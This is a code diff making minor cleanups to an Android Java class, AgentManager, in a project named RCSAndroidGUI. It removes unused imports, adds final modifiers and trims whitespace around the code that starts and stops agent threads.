@@ -9,14 +9,11 @@ package com.ht.RCSAndroidGUI.agent;
 
 import java.util.HashMap;
 import java.util.Iterator;
-import java.util.Map;
 
 import android.util.Log;
 
 import com.ht.RCSAndroidGUI.Manager;
 import com.ht.RCSAndroidGUI.Status;
-import com.ht.RCSAndroidGUI.event.Event;
-import com.ht.RCSAndroidGUI.event.EventBase;
 import com.ht.RCSAndroidGUI.utils.Check;
 
 /**
@@ -230,10 +227,10 @@ public class AgentManager extends Manager {
 
 		Check.asserts(a != null, "null agent");
 		Check.asserts(running.get(key) != null, "null running");
-		
+
 		a.parse(agents.get(key).getParams());
 
-		Thread t = new Thread(a);
+		final Thread t = new Thread(a);
 		threads.put(a, t);
 		t.start();
 
@@ -251,14 +248,14 @@ public class AgentManager extends Manager {
 			Log.d("RCS", "Agent " + key + " not present");
 			return;
 		}
-		
+
 		a.stopThread();
 
-		Thread t = threads.get(a);
+		final Thread t = threads.get(a);
 		if (t != null) {
 			try {
 				t.join();
-			} catch (InterruptedException e) {
+			} catch (final InterruptedException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
 			}
